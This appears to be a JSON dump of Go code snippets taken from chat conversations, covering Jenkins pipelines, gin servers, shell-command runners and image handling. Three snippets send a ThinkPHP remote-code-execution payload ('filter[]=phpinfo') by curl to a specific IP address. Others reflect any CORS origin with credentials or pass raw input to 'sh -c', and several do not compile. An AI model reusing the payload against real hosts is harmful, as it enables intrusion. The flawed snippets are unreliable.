    "filename": "6a525fdedd40d7838d6c6ae68c8390bb_0.go"
  },
  {
    "conversation_hash": "c4011ba3b577335f9e459881d43b4042",
    "code_index": 9,
    "language": "Go",
    "libraries": [],
    "code": "pipeline {\n    agent any\n    stages {\n        stage('Build') {\n            steps {\n                script {\n                    // 使用构建编号来创建全局唯一的工作目录\n                    def wsRoot = \"${env.WORKSPACE}/build-${env.BUILD_NUMBER}\"\n\n                    // 为每个并行步骤创建独立的工作目录\n                    def wsA = \"${wsRoot}/job_a\"\n                    sh \"mkdir -p ${wsA}\"\n\n                    def wsB = \"${wsRoot}/job_b\"\n                    sh \"mkdir -p ${wsB}\"\n\n                    def wsC = \"${wsRoot}/job_c\"\n                    sh \"mkdir -p ${wsC}\"\n\n                    // 在每个并行步骤中设置工作目录\n                    parallel {\n                        stage('Job A') {\n                            steps {\n                                dir(wsA) {\n                                    sh \"./myscript.sh\"\n                                }\n                            }\n                        }\n                        stage('Job B') {\n                            steps {\n                                dir(wsB) {\n                                    sh \"./myscript.sh\"\n                                }\n                            }\n                        }\n                        stage('Job C') {\n                            steps {\n                                dir(wsC) {\n                                    sh \"./myscript.sh\"\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n}",
    "filename": "c4011ba3b577335f9e459881d43b4042_9.go"
  },
  {
    "conversation_hash": "f5cc3f319bb9702f49ef82d50d05f25b",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n    router := gin.Default()\n\n    router.Use(func(c *gin.Context) {\n        c.Header(\"Access-Control-Allow-Origin\", c.Request.Header.Get(\"Origin\"))\n        c.Header(\"Access-Control-Allow-Methods\", \"POST, GET, OPTIONS, PUT, DELETE\")\n        c.Header(\"Access-Control-Allow-Headers\", \"Origin, Content-Type, Content-Length, Accept-Encoding, X-CSRF-Token, Authorization\")\n        c.Header(\"Access-Control-Allow-Credentials\", \"true\")\n        if c.Request.Method == \"OPTIONS\" {\n            c.AbortWithStatus(http.StatusNoContent)\n            return\n        }\n        c.Next()\n    })\n\n    router.GET(\"/ping\", func(c *gin.Context) {\n        c.String(http.StatusOK, \"pong\")\n    })\n\n    router.Run(\":8080\")\n}",
    "filename": "f5cc3f319bb9702f49ef82d50d05f25b_2.go"
  },
  {
    "conversation_hash": "9342deb1ed354ff1697ed35c78127b2c",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"io\"\n\t\"math\"\n\t\"os\"\n\t\"strconv\"\n\t\"strings\"\n)\n\ntype info struct {\n\trestarts int\n\tdisabled map[int]struct{}\n}\n\nfunc solve(fIn *os.File, fOut *os.File) {\n\tbuf, err := io.ReadAll(fIn)\n\tif err != nil {\n\t\tpanic(\"Error while reading\")\n\t}\n\tout := bufio.NewWriter(fOut)\n\tdefer out.Flush()\n\n\tstr := string(buf)\n\tlines := strings.Split(str, \"\\n\")\n\tline0 := strings.Split(lines[0], \" \")\n\t//n, _ := strconv.Atoi(line0[0])\n\tm, _ := strconv.Atoi(line0[1])\n\tq, _ := strconv.Atoi(line0[2])\n\n\tdata := make(map[int]*info)\n\tfor i := 1; i < (q + 1); i++ {\n\t\tcommand := strings.Split(lines[i], \" \")\n\t\tswitch command[0] {\n\t\tcase \"RESET\":\n\t\t\tcenter, _ := strconv.Atoi(command[1])\n\t\t\tif _, ok := data[center]; !ok {\n\t\t\t\tdata[center] = &info{1, make(map[int]struct{})}\n\t\t\t} else {\n\t\t\t\tdata[center].restarts += 1\n\t\t\t\tdata[center].disabled = make(map[int]struct{})\n\t\t\t}\n\t\tcase \"DISABLE\":\n\t\t\tcenter, _ := strconv.Atoi(command[1])\n\t\t\tserver, _ := strconv.Atoi(command[2])\n\t\t\tif _, ok := data[center]; !ok {\n\t\t\t\tdata[center] = &info{0, make(map[int]struct{})}\n\t\t\t}\n\t\t\tdata[center].disabled[server] = struct{}{}\n\t\tcase \"GETMAX\":\n\t\t\tmaxValue := 0\n\t\t\tmaxKey := 1\n\t\t\tfor key, value := range data {\n\t\t\t\tcurrent := value.restarts * (m - len(value.disabled))\n\t\t\t\tif len(value.disabled) == m {\n\t\t\t\t\tcurrent = 0\n\t\t\t\t}\n\t\t\t\tif current == maxValue && key < maxKey {\n\t\t\t\t\tmaxKey = key\n\t\t\t\t}\n\t\t\t\tif current > maxValue {\n\t\t\t\t\tmaxValue = current\n\t\t\t\t\tmaxKey = key\n\t\t\t\t}\n\t\t\t}\n\t\t\tout.WriteString(strconv.Itoa(maxKey))\n\t\t\tout.WriteByte('\\n')\n\t\tcase \"GETMIN\":\n\t\t\tminValue := math.MaxInt\n\t\t\tminKey := 1\n\t\t\tfor key, value := range data {\n\t\t\t\tcurrent := value.restarts * (m - len(value.disabled))\n\t\t\t\tif len(value.disabled) == m {\n\t\t\t\t\tcurrent = 0\n\t\t\t\t}\n\t\t\t\tif current == minValue && key < minKey {\n\t\t\t\t\tminKey = key\n\t\t\t\t}\n\t\t\t\tif current < minValue {\n\t\t\t\t\tminValue = current\n\t\t\t\t\tminKey = key\n\t\t\t\t}\n\t\t\t}\n\t\t\tout.WriteString(strconv.Itoa(minKey))\n\t\t\tout.WriteByte('\\n')\n\t\t}\n\t}\n}\n\nfunc main() {\n\tdata, _ := os.Open(\"input.txt\")\n\tsolve(data, os.Stdout)\n}",
    "filename": "9342deb1ed354ff1697ed35c78127b2c_1.go"
  },
  {
    "conversation_hash": "834873a6e08c10b7fa329a288956f6a3",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"time\"\n)\n\nfunc main() {\n    // 加载上海时区\n    loc, _ := time.LoadLocation(\"Asia/Shanghai\")\n    \n    // 使用上海时区获取当前时间\n    now := time.Now().In(loc)\n    \n    fmt.Println(now)\n}",
    "filename": "834873a6e08c10b7fa329a288956f6a3_1.go"
  },
  {
    "conversation_hash": "834873a6e08c10b7fa329a288956f6a3",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc main() {\n\t// 加载上海时区\n\tloc, err := time.LoadLocation(\"Asia/Shanghai\")\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\t// 获取当前时间\n\tnow := time.Now()\n\n\t// 使用上海时区转换时间\n\tshanghaiTime := now.In(loc)\n\n\tfmt.Println(shanghaiTime)\n}",
    "filename": "834873a6e08c10b7fa329a288956f6a3_2.go"
  },
  {
    "conversation_hash": "834873a6e08c10b7fa329a288956f6a3",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "func getImage(c *gin.Context) {\n  // 从磁盘或其他地方获取图片的bytes数组\n  data, err := ioutil.ReadFile(\"[Path_to_image_file]/image.png\")\n  if err != nil {\n    // 读取失败则返回404\n    c.Status(http.StatusNotFound)\n    return\n  }\n  \n  // 设置响应头为图片类型\n  c.Header(\"Content-Type\", \"image/png\")\n\n  // 将字节数组写入响应体\n  c.Writer.Write(data)\n}",
    "filename": "834873a6e08c10b7fa329a288956f6a3_4.go"
  },
  {
    "conversation_hash": "834873a6e08c10b7fa329a288956f6a3",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"os/exec\"\n)\n\nfunc main() {\n\t// 定义命令参数\n\tcmdArgs := []string{\n\t\t\"echo\",\n\t\t\"Hello, World!\",\n\t}\n\n\t// 创建命令对象\n\tcmd := exec.Command(cmdArgs[0], cmdArgs[1:]...)\n\n\t// 执行命令并获取输出\n\toutput, err := cmd.Output()\n\tif err != nil {\n\t\tfmt.Println(err)\n\t\treturn\n\t}\n\n\t// 打印输出\n\tfmt.Println(string(output))\n}",
    "filename": "834873a6e08c10b7fa329a288956f6a3_5.go"
  },
  {
    "conversation_hash": "834873a6e08c10b7fa329a288956f6a3",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"flag\"\n\t\"fmt\"\n\t\"os/exec\"\n)\n\nfunc main() {\n\t// 定义命令行参数\n\tvar command string\n\tflag.StringVar(&command, \"command\", \"\", \"command to execute\")\n\n\t// 解析命令行参数\n\tflag.Parse()\n\n\t// 生成执行命令的 Command 对象\n\tcmd := exec.Command(\"/bin/sh\", \"-c\", command)\n\n\t// 执行命令并等待完成\n\toutput, err := cmd.CombinedOutput()\n\tif err != nil {\n\t\t// 如果执行命令发生错误，则输出错误消息\n\t\tfmt.Println(\"Error executing command:\", err)\n\t} else {\n\t\t// 否则输出命令的输出结果\n\t\tfmt.Println(string(output))\n\t}\n}",
    "filename": "834873a6e08c10b7fa329a288956f6a3_8.go"
  },
  {
    "conversation_hash": "92f2bb1047beeef96e14a4a58ba01861",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"flag\"\n    \"fmt\"\n    \"os\"\n    \"os/exec\"\n)\n\nfunc main() {\n    // 定义命令行参数\n    cmd := flag.String(\"c\", \"\", \"command to execute\")\n\n    // 解析命令行参数\n    flag.Parse()\n\n    // 执行命令\n    if *cmd == \"\" {\n        flag.Usage()\n        os.Exit(1)\n    }\n    out, err := exec.Command(\"bash\", \"-c\", *cmd).CombinedOutput()\n    if err != nil {\n        fmt.Fprintf(os.Stderr, \"error: %v\\n\", err)\n        os.Exit(1)\n    }\n    fmt.Fprintf(os.Stdout, \"%s\", out)\n}",
    "filename": "92f2bb1047beeef96e14a4a58ba01861_0.go"
  },
  {
    "conversation_hash": "92f2bb1047beeef96e14a4a58ba01861",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"flag\"\n\t\"fmt\"\n\t\"os\"\n\t\"os/exec\"\n\t\"strings\"\n)\n\nfunc main() {\n\tcmd := flag.String(\"cmd\", \"\", \"command to execute\")\n\n\tflag.Parse()\n\n\tif *cmd == \"\" {\n\t\tflag.Usage()\n\t\tos.Exit(1)\n\t}\n\n\targs := splitArgs(*cmd)\n\tcmdObj := exec.Command(args[0], args[1:]...)\n\n\tout, err := cmdObj.CombinedOutput()\n\tif err != nil {\n\t\tfmt.Fprintf(os.Stderr, \"error: %v\\n\", err)\n\t\tos.Exit(1)\n\t}\n\n\tfmt.Fprintf(os.Stdout, \"%s\", out)\n}\n\nfunc splitArgs(cmd string) []string {\n\tvar args []string\n\n\tq := false\n\tbuf := &strings.Builder{}\n\n\tfor _, c := range cmd {\n\t\tswitch c {\n\t\tcase '\\\\':\n\t\t\tq = true\n\t\tcase ' ':\n\t\t\tif !q {\n\t\t\t\targs = append(args, buf.String())\n\t\t\t\tbuf.Reset()\n\t\t\t} else {\n\t\t\t\tbuf.WriteRune(c)\n\t\t\t}\n\t\t\tq = false\n\t\tcase '\"', '\\'':\n\t\t\tif !q {\n\t\t\t\tq = true\n\t\t\t} else {\n\t\t\t\targs = append(args, buf.String())\n\t\t\t\tbuf.Reset()\n\t\t\t\tq = false\n\t\t\t}\n\t\tdefault:\n\t\t\tbuf.WriteRune(c)\n\t\t}\n\t}\n\n\tif buf.Len() > 0 {\n\t\targs = append(args, buf.String())\n\t}\n\n\treturn args\n}",
    "filename": "92f2bb1047beeef96e14a4a58ba01861_1.go"
  },
  {
    "conversation_hash": "92f2bb1047beeef96e14a4a58ba01861",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"flag\"\n\t\"fmt\"\n\t\"os\"\n\t\"os/exec\"\n\t\"strings\"\n)\n\nfunc main() {\n\tcmd := flag.String(\"cmd\", \"\", \"command to execute\")\n\tflag.Parse()\n\n\tif *cmd == \"\" {\n\t\tflag.Usage()\n\t\tos.Exit(1)\n\t}\n\n\targs := splitArgs(*cmd)\n\tcmdObj := exec.Command(args[0], args[1:]...)\n\n\tout, err := cmdObj.CombinedOutput()\n\tif err != nil {\n\t\tfmt.Fprintf(os.Stderr, \"error: %v\\n\", err)\n\t\tos.Exit(1)\n\t}\n\n\tfmt.Fprintf(os.Stdout, \"%s\", out)\n}\n\n// 将命令行字符串拆分成一个个参数\nfunc splitArgs(cmd string) []string {\n\tvar args []string\n\n\tq := false   // 是否在引号内\n\tescape := false  // 上一个字符是否为转义字符\n\tbuf := &strings.Builder{}\n\n\tfor _, c := range cmd {\n\t\tswitch {\n\t\tcase escape:\n\t\t\tbuf.WriteRune(c)\n\t\t\tescape = false\n\t\tcase c == '\\\\':\n\t\t\tescape = true\n\t\tcase c == ' ' && !q:\n\t\t\tif buf.Len() > 0 {\n\t\t\t\targs = append(args, buf.String())\n\t\t\t\tbuf.Reset()\n\t\t\t}\n\t\tcase c == '\"' || c == '\\'':\n\t\t\tif q {\n\t\t\t\targs = append(args, buf.String())\n\t\t\t\tbuf.Reset()\n\t\t\t\tq = false\n\t\t\t} else {\n\t\t\t\tq = true\n\t\t\t}\n\t\tdefault:\n\t\t\tbuf.WriteRune(c)\n\t\t}\n\t}\n\n\tif buf.Len() > 0 {\n\t\targs = append(args, buf.String())\n\t}\n\n\treturn args\n}",
    "filename": "92f2bb1047beeef96e14a4a58ba01861_2.go"
  },
  {
    "conversation_hash": "92f2bb1047beeef96e14a4a58ba01861",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"flag\"\n\t\"fmt\"\n\t\"os\"\n\t\"os/exec\"\n\t\"strings\"\n)\n\nfunc main() {\n\tcmd := flag.String(\"cmd\", \"\", \"command to execute\")\n\tflag.Parse()\n\n\tif *cmd == \"\" {\n\t\tflag.Usage()\n\t\tos.Exit(1)\n\t}\n\n\targs := splitArgs(*cmd)\n\tcmdObj := exec.Command(args[0], args[1:]...)\n\n\tout, err := cmdObj.CombinedOutput()\n\tif err != nil {\n\t\tfmt.Fprintf(os.Stderr, \"error: %v\\n\", err)\n\t\tos.Exit(1)\n\t}\n\n\tfmt.Fprintf(os.Stdout, \"%s\", out)\n}\n\n// 将命令行字符串拆分成一个个参数\nfunc splitArgs(cmd string) []string {\n\tvar args []string\n\n\tq := false   // 是否在引号内\n\tescape := false  // 上一个字符是否为转义字符\n\tbuf := strings.Builder{}\n\n\tfor _, c := range cmd {\n\t\tswitch {\n\t\tcase escape:\n\t\t\tbuf.WriteRune(c)\n\t\t\tescape = false\n\t\tcase c == '\\\\':\n\t\t\tescape = true\n\t\tcase c == ' ' && !q:\n\t\t\tif buf.Len() > 0 {\n\t\t\t\targs = append(args, buf.String())\n\t\t\t\tbuf.Reset()\n\t\t\t}\n\t\tcase c == '\"' || c == '\\'':\n\t\t\tif q {\n\t\t\t\targs = append(args, buf.String())\n\t\t\t\tbuf.Reset()\n\t\t\t\tq = false\n\t\t\t} else {\n\t\t\t\tq = true\n\t\t\t}\n\t\tdefault:\n\t\t\tbuf.WriteRune(c)\n\t\t}\n\t}\n\n\tif buf.Len() > 0 {\n\t\targs = append(args, buf.String())\n\t}\n\n\treturn args\n}",
    "filename": "92f2bb1047beeef96e14a4a58ba01861_3.go"
  },
  {
    "conversation_hash": "9f6a3050a9d3cfb82de8540c42bce55c",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"os/exec\"\n)\n\nfunc main() {\n\tcmd := exec.Command(\n\t\t\"curl\",\n\t\t\"-X\",\n\t\t\"POST\",\n\t\t\"-d\",\n\t\t\"_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1\",\n\t\t\"-H\",\n\t\t\"Accept: */*\",\n\t\t\"-H\",\n\t\t\"Accept-Language: en\",\n\t\t\"-H\",\n\t\t\"Content-Type: application/x-www-form-urlencoded\",\n\t\t\"-H\",\n\t\t\"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36\",\n\t\t\"http://106.75.13.27:8081/index.php?s=captcha\",\n\t)\n\n\tout, err := cmd.Output()\n\tif err != nil {\n\t\tfmt.Println(err)\n\t}\n\tfmt.Println(string(out))\n}",
    "filename": "9f6a3050a9d3cfb82de8540c42bce55c_1.go"
  },
  {
    "conversation_hash": "9f6a3050a9d3cfb82de8540c42bce55c",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"os/exec\"\n)\n\nfunc main() {\n    cmd := exec.Command(\n        \"curl\",\n        \"-X\",\n        \"POST\",\n        \"-d\",\n        \"_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1\",\n        \"-H\",\n        \"Accept: */*\",\n        \"-H\",\n        \"Accept-Language: en\",\n        \"-H\",\n        \"Content-Type: application/x-www-form-urlencoded\",\n        \"-H\",\n        \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36\",\n        \"http://106.75.13.27:8081/index.php?s=captcha\",\n    )\n\n    out, err := cmd.Output()\n    if err != nil {\n        fmt.Println(err)\n    }\n    fmt.Println(string(out))\n}",
    "filename": "9f6a3050a9d3cfb82de8540c42bce55c_2.go"
  },
  {
    "conversation_hash": "9f6a3050a9d3cfb82de8540c42bce55c",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"regexp\"\n    \"strings\"\n)\n\nfunc main() {\n    s := `a b 'c d e' f g`\n    re := regexp.MustCompile(`'[^']*'|\\S+`)\n    parts := re.FindAllString(s, -1)\n    for _, part := range parts {\n        fmt.Println(strings.Trim(part, \"'\"))\n    }\n}",
    "filename": "9f6a3050a9d3cfb82de8540c42bce55c_3.go"
  },
  {
    "conversation_hash": "9f6a3050a9d3cfb82de8540c42bce55c",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"regexp\"\n\t\"strings\"\n)\n\nfunc main() {\n\ts := \"a b 'c d e' f g 'h i j' k\"\n\tre := regexp.MustCompile(`'(.*?)'|\\S+`)\n\tparts := re.FindAllString(s, -1)\n\tfor _, part := range parts {\n\t\tif strings.HasPrefix(part, \"'\") && strings.HasSuffix(part, \"'\") {\n\t\t\tfmt.Print(strings.Trim(part, \"'\"))\n\t\t} else {\n\t\t\tfmt.Print(part)\n\t\t}\n\t\t\n\t\tfmt.Print(\" \")\n\t}\n}",
    "filename": "9f6a3050a9d3cfb82de8540c42bce55c_4.go"
  },
  {
    "conversation_hash": "9f6a3050a9d3cfb82de8540c42bce55c",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"context\"\n\t\"io/ioutil\"\n\n\t\"github.com/chromedp/chromedp\"\n)\n\nfunc main() {\n\turl := \"http://106.75.13.27:8081/index.php?s=captcha\"\n\thtmlContent := getHTML(url)\n\n\topts := append(chromedp.DefaultExecAllocatorOptions[:],\n\t\tchromedp.Flag(\"headless\", false),\n\t)\n\n\tallocCtx, cancel := chromedp.NewExecAllocator(context.Background(), opts...)\n\tdefer cancel()\n\n\tctx, cancel := chromedp.NewContext(\n\t\tallocCtx,\n\t\tchromedp.WithLogf(func(format string, args ...interface{}) {\n\t\t\t// do nothing (suppress logs)\n\t\t}),\n\t)\n\tdefer cancel()\n\n\tvar buf []byte\n\tif err := chromedp.Run(ctx,\n\t\tchromedp.Navigate(url),\n\t\tchromedp.ActionFunc(func(ctx context.Context) error {\n\t\t\terr := chromedp.Run(ctx, chromedp.Sleep(1))\n\t\t\tif err == nil {\n\t\t\t\treturn nil\n\t\t\t}\n\t\t\treturn err\n\t\t}),\n\t\tchromedp.ActionFunc(func(ctx context.Context) error {\n\t\t\treturn ioutil.WriteFile(\"screenshot.png\", buf, 0644)\n\t\t}),\n\t\tchromedp.ActionFunc(func(ctx context.Context) error {\n\t\t\treturn chromedp.ActionFunc(func(ctx context.Context) error {\n\t\t\t\tvar err error\n\t\t\t\tbuf, err = chromedp.CaptureScreenshot().WithQuality(90).WithClip(&chromedp.Rect{\n\t\t\t\t\tTop:    0,\n\t\t\t\t\tLeft:   0,\n\t\t\t\t\tBottom: 0, // '0' indicates the full length / height of the page\n\t\t\t\t\tRight:  0,\n\t\t\t\t}).Do(ctx)\n\t\t\t\treturn err\n\t\t\t}).Do(ctx)\n\t\t}),\n\t); err != nil {\n\t\tpanic(err)\n\t}\n}\n\nfunc getHTML(url string) string {\n\tcmd := exec.Command(\n\t\t\"curl\",\n\t\t\"-X\",\n\t\t\"POST\",\n\t\t\"-d\",\n\t\t\"_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1\",\n\t\t\"-H\",\n\t\t\"Accept: */*\",\n\t\t\"-H\",\n\t\t\"Accept-Language: en\",\n\t\t\"-H\",\n\t\t\"Content-Type: application/x-www-form-urlencoded\",\n\t\t\"-H\",\n\t\t\"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36\",\n\t\turl,\n\t)\n\n\tout, err := cmd.Output()\n\tif err != nil {\n\t\treturn \"\"\n\t}\n\treturn string(out)\n}",
    "filename": "9f6a3050a9d3cfb82de8540c42bce55c_5.go"
  },
  {
    "conversation_hash": "9f6a3050a9d3cfb82de8540c42bce55c",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bytes\"\n\t\"fmt\"\n\t\"image\"\n\t\"image/jpeg\"\n\t\"image/png\"\n\t\"io/ioutil\"\n\t\"os\"\n)\n\nfunc main() {\n\t// 用于测试的 PNG 文件内容\n\trawPNG := []byte{137, 80, 78, 71, 13, 10, 26, 10, 0, 0, 0, 13, 73, 72, 68, 82, 0, 0, 0, 10, 0, 0, 0, 10, 8, 6, 0, 0, 0, 140, 144, 91, 249, 0, 0, 0, 29, 116, 69, 88, 116, 83, 111, 102, 116, 119, 97, 114, 101, 0, 71, 101, 110, 101, 114, 97, 116, 101, 100, 32, 119, 105, 116, 104, 32, 71, 73, 77, 80, 6, 1, 2, 0, 0, 0, 0, 15, 73, 68, 65, 84, 120, 94, 237, 157, 215, 49, 14, 194, 48, 12, 69, 209, 75, 201, 117, 52, 44, 77, 2, 20, 21, 39, 253, 74, 34, 165, 1, 7, 184, 195, 40, 189, 39, 14, 106, 83, 58, 66, 173, 120, 98, 131, 246, 70, 170, 84, 97, 80, 110, 228, 0, 0, 0, 0, 73, 69, 78, 68, 174, 66, 96, 130}\n\n\t// 将 PNG 文件内容解码为 image.Image 类型\n\timg, err := png.Decode(bytes.NewReader(rawPNG))\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\t// 将解码后的图片保存为 JPG 文件\n\tf, err := os.Create(\"out.jpg\")\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\tdefer f.Close()\n\n\terr = jpeg.Encode(f, img, nil)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\tfmt.Println(\"done\")\n}",
    "filename": "9f6a3050a9d3cfb82de8540c42bce55c_6.go"
  },
  {
    "conversation_hash": "e3d4a8359c0d06e923f54a66e58e45aa",
    "code_index": 0,
    "language": "Go",
    "libraries": [
      "bytes"
    ],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"image\"\n    \"image/jpeg\"\n    \"io/ioutil\"\n    \"net/http\"\n    \"os\"\n\n    \"github.com/disintegration/imaging\"\n)\n\nfunc main() {\n    res, err := http.Get(\"https://www.example.com\")\n    if err != nil {\n        fmt.Println(err)\n        return\n    }\n    defer res.Body.Close()\n\n    data, err := ioutil.ReadAll(res.Body)\n    if err != nil {\n        fmt.Println(err)\n        return\n    }\n\n    // create image from bytes\n    img, _, err := image.Decode(bytes.NewReader(data))\n    if err != nil {\n        fmt.Println(err)\n        return\n    }\n\n    // resize the image\n    img = imaging.Resize(img, 1000, 0, imaging.Lanczos)\n\n    // write image to file\n    f, err := os.Create(\"image.jpg\")\n    if err != nil {\n        fmt.Println(err)\n        return\n    }\n    defer f.Close()\n\n    err = jpeg.Encode(f, img, &jpeg.Options{Quality: 100})\n    if err != nil {\n        fmt.Println(err)\n        return\n    }\n}",
    "filename": "e3d4a8359c0d06e923f54a66e58e45aa_0.go"
  },
  {
    "conversation_hash": "8fe9727aaffa4f5f3029a7e1e14f9312",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"os/exec\"\n)\n\nfunc main() {\n    cmd := exec.Command(\"ls\", \"-l\", \"/\")\n    err := cmd.Run()\n    if err != nil {\n        fmt.Printf(\"Error: %s\", err)\n    }\n}",
    "filename": "8fe9727aaffa4f5f3029a7e1e14f9312_0.go"
  },
  {
    "conversation_hash": "8fe9727aaffa4f5f3029a7e1e14f9312",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"github.com/foolin/goview/supports/gocraft-pongo2\"\n\t. \"github.com/neko-dev/goh2img/html2img\"\n\t\"log\"\n\t\"syscall/js\"\n)\n\nfunc main() {\n\topts := Options{\n\t\tOutputPath: \"test.png\",\n\t}\n\n\t// 获取HTML\n\teditor := js.Global().Get(\"document\").Call(\"getElementById\", \"editor\")\n\tdata := editor.Call(\"getRangeContent\").String()\n\n\t// 导出PNG\n\terr := FromHtml([]byte(data), &opts)\n\n\tif err != nil {\n\t\tlog.Fatalln(err)\n\t}\n}",
    "filename": "8fe9727aaffa4f5f3029a7e1e14f9312_1.go"
  },
  {
    "conversation_hash": "8fe9727aaffa4f5f3029a7e1e14f9312",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"github.com/SebastiaanKlippert/go-wkhtmltopdf\"\n\t\"log\"\n)\n\nfunc main() {\n\tpdfg, err := wkhtmltopdf.NewPDFGenerator()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// 设置页面大小、方向等参数\n\tpdfg.PageSize.Set(wkhtmltopdf.PageSizeA4)\n\tpdfg.Orientation.Set(wkhtmltopdf.OrientationPortrait)\n\tpdfg.Dpi.Set(300)\n\n\t// 设置输入文件路径和输出文件路径\n\tpdfg.AddPage(wkhtmltopdf.NewPageReader(\"path/to/file.html\"))\n\tpdfg.Create()\n\n\terr = pdfg.WriteFile(\"output.pdf\")\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n}",
    "filename": "8fe9727aaffa4f5f3029a7e1e14f9312_2.go"
  },
  {
    "conversation_hash": "8fe9727aaffa4f5f3029a7e1e14f9312",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bytes\"\n\t\"fmt\"\n\t\"image/png\"\n\t\"io/ioutil\"\n\t\"net/http\"\n\t\"os\"\n\t\"strings\"\n\n\tscreenshot \"github.com/vincent-petithory/go-screenshot\"\n)\n\nfunc main() {\n\tpage, err := getCurlPage(\"https://www.google.com\")\n\tif err != nil {\n\t\tfmt.Printf(\"Error: %s\", err)\n\t\treturn\n\t}\n\n\t// 将page转化为image\n\timg, err := screenshot.DecodeFromReader(bytes.NewBuffer(page))\n\tif err != nil {\n\t\tfmt.Printf(\"Error: %s\", err)\n\t\treturn\n\t}\n\n\t// 将image保存为png文件\n\tfile, err := os.Create(\"output.png\")\n\tif err != nil {\n\t\tfmt.Printf(\"Error: %s\", err)\n\t\treturn\n\t}\n\tdefer file.Close()\n\n\terr = png.Encode(file, img)\n\tif err != nil {\n\t\tfmt.Printf(\"Error: %s\", err)\n\t\treturn\n\t}\n}\n\nfunc getCurlPage(url string) ([]byte, error) {\n\tcurl := exec.Command(\"curl\", \"-s\", url)\n\tstdout, err := curl.StdoutPipe()\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\terr = curl.Start()\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tpage, err := ioutil.ReadAll(stdout)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\terr = curl.Wait()\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\treturn page, nil\n}",
    "filename": "8fe9727aaffa4f5f3029a7e1e14f9312_3.go"
  },
  {
    "conversation_hash": "8fe9727aaffa4f5f3029a7e1e14f9312",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bytes\"\n\t\"fmt\"\n\t\"image/png\"\n\t\"net/http\"\n\t\"os\"\n\n\tscreenshot \"github.com/vincent-petithory/go-screenshot\"\n)\n\nfunc main() {\n\tresp, err := http.Get(\"https://www.google.com\")\n\tif err != nil {\n\t\tfmt.Printf(\"Error: %s\", err)\n\t\treturn\n\t}\n\tdefer resp.Body.Close()\n\n\tpage, err := readResponseBody(resp)\n\tif err != nil {\n\t\tfmt.Printf(\"Error: %s\", err)\n\t\treturn\n\t}\n\n\t// 将page转化为image\n\timg, err := screenshot.DecodeFromReader(bytes.NewBuffer(page))\n\tif err != nil {\n\t\tfmt.Printf(\"Error: %s\", err)\n\t\treturn\n\t}\n\n\t// 将image保存为png文件\n\tfile, err := os.Create(\"output.png\")\n\tif err != nil {\n\t\tfmt.Printf(\"Error: %s\", err)\n\t\treturn\n\t}\n\tdefer file.Close()\n\n\terr = png.Encode(file, img)\n\tif err != nil {\n\t\tfmt.Printf(\"Error: %s\", err)\n\t\treturn\n\t}\n}\n\nfunc readResponseBody(resp *http.Response) ([]byte, error) {\n\tbody := &bytes.Buffer{}\n\t_, err := body.ReadFrom(resp.Body)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\treturn body.Bytes(), nil\n}",
    "filename": "8fe9727aaffa4f5f3029a7e1e14f9312_4.go"
  },
  {
    "conversation_hash": "8a0ea8d1c5c33accd99cc53a9b5ec608",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
